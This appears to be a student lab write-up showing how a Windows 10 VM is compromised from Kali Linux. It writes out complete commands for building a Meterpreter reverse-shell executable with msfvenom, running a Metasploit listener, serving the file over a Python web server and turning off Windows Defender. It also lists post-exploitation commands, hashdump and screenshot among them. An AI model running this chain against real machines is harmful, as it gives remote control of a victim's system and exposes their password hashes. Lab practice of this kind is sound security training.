# üíÄ Project 2: Windows VM Compromise via Malware Execution

## üß† Objective

Simulate a real-world cyberattack by generating a malicious payload on Kali Linux, executing it on a Windows VM, and gaining remote access through a reverse shell.

---

## üõ†Ô∏è Tools Used

- **Attacker Machine**: Kali Linux (VirtualBox)
- **Victim Machine**: Windows 10 (VirtualBox)
- **Utilities**:
  -  Enabled Remote desktop in Windows Vm
  - `msfvenom` ‚Äì to create the reverse shell payload
  - `Metasploit Framework` ‚Äì for listener and session control
  - `Python3` ‚Äì for hosting the payload
  - `Windows Defender` ‚Äì disabled temporarily for execution

## üß± Lab Setup

| Machine        | OS         | Role     | IP Address     |
|----------------|------------|----------|----------------|
| Kali Linux     | Kali 2023+ | Attacker | 192.168.x.10   |
| Windows 10     | Win10 Pro  | Victim   | 192.168.x.20   |

_Note: Replace IP addresses with your actual VM IPs._

## üî® Step-by-Step Execution

### 1. Generate Reverse Shell Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.x.10 LPORT=4444 -f exe > reverse_shell.exe
```

This creates a Windows executable that connects back to Kali on port 4444.

2. Start Metasploit Listener
```bash
msfconsole
```
Inside Metasploit:
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.x.10
set LPORT 4444
exploit
```
3. Transfer Payload to Windows VM
Run a Python HTTP server in Kali:
```bash
python3 -m http.server 8080
```

Then in Windows VM browser:

```bash
http://192.168.x.10:8080/reverse_shell.exe
```
‚ö†Ô∏è Disable antivirus temporarily to avoid deletion.

4. Execute Payload in Windows
   Double-click the file reverse_shell.exe. Back in Kali‚Äôs Metasploit console, you'll see:
   ```ngnix
   Meterpreter session 1 opened
   ```
5. Post-Exploitation Examples
```bash
dir   #list out the files
ipconfig   # will give the info of victim vm
sysinfo       # Get system info
getuid        # Get current user
screenshot    # Capture victim's screen
hashdump      # Dump password hashes
```
